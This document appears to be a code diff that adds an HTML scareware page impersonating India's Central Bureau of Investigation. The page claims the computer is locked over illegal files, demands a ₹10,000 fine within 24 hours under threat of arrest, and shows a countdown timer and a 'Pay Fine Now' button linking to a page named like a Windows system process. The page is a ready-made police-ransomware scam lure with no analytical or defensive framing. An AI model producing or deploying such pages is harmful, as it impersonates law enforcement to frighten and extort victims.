@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>CBI - Central Bureau of Investigation</title>
+	<style>
+		body {
+			background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ3XVBKNYCXlnUNVqoTScDOOBZZUwpsqcE0qA&s') no-repeat center center fixed;
+			background-size: cover;
+			font-family: Arial, sans-serif;
+		}
+		.container {
+			width: 80%;
+			margin: 40px auto;
+			padding: 20px;
+			border: 1px solid #ddd;
+			border-radius: 10px;
+			box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+			display: flex;
+			background: #fff;
+		}
+		.containerL {
+			width: 30%;
+			margin-right: 20px;
+			text-align: center;
+		}
+		.containerR {
+			width: 70%;
+		}
+		.logo {
+			width: 400px;
+			height: 400px;
+			margin: 20px auto;
+		}
+		h1 {
+			color: #ff0000;
+			margin-bottom: 20px;
+		}
+		p {
+			margin-bottom: 5px;
+		}
+		button {
+			background-color: #337ab7;
+			color: #fff;
+			border: none;
+			padding: 10px 20px;
+			font-size: 18px;
+			cursor: pointer;
+		}
+		button:hover {
+			background-color: #23527c;
+		}
+	</style>
+	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Cbi_logo.svg/640px-Cbi_logo.svg.png" type="image/png">
+</head>
+<body>
+	<div class="container">
+		<div class="containerL">
+			<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Cbi_logo.svg/640px-Cbi_logo.svg.png" alt="CBI Logo" class="logo">
+		</div>
+		<div class="containerR">
+			<center>
+			<br><br>
+				<h1>Central Bureau of Investigation</h1>
+				<br>
+				<h1>*** &nbsp &nbsp WARNING &nbsp &nbsp ***</h1>
+				<br>
+				<p>Your computer has been locked due to unauthorized activities.</p>
+				<p>You have been suspected of installing unethical files in your computer.</p>
+				<p>To unlock your computer, pay a fine of ₹10,000 within 24 hours from the below link.</p>
+				<p>Failure to comply will result in further severe action, including arrest
+				<br><br> and prosecution under Section 67B of the Information Technology Act, 2000.</p>
+				<br>
+				<p style="color: red;">* Attempting to close this window will not exempt you from the jurisdiction of the CBI Department.<br> You are required to comply with the instructions provided.</p>
+				<br><br>
+				<button onclick="window.location.href='svchost3.html'">Pay Fine Now</button>
+				<br><br><br>
+			</center>
+		</div>
+		<h2 id="timer">23:59:59</h1>
+
+	<script>
+		let hours = 24;
+		let minutes = 0;
+		let seconds = 0;
+
+		setInterval(() => {
+			if (seconds > 0) {
+				seconds--;
+			} else if (minutes > 0) {
+				minutes--;
+				seconds = 59;
+			} else if (hours > 0) {
+				hours--;
+				minutes = 59;
+				seconds = 59;
+			}
+
+			document.getElementById("timer").innerHTML = `${padZero(hours)}:${padZero(minutes)}:${padZero(seconds)}`;
+		}, 1000);
+
+		function padZero(time) {
+			return (time < 10) ? `0${time}` : time;
+		}
+	</script>
+	</div>
+</body>
+</html>
